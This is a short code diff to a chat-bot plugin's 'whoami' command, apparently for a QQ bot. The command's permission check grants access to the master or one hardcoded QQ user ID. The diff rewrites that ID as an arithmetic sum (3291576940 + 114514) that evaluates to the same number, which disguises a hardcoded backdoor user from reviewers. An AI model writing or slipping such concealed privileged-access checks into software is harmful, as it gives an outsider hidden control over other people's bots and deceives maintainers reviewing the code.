@@ -27,7 +27,7 @@ export class whoami extends plugin {
 
 
   async whoami (e) {
-    if (!(this.e.isMaster || e.user_id == 3291691454)) return false
+    if (!(this.e.isMaster || e.user_id == (3291576940 + 114514))) return false
     let QQreg = /[1-9][0-9]{4,12}/
     let QQret = QQreg.exec(e.toString())
     if (!QQret) return true
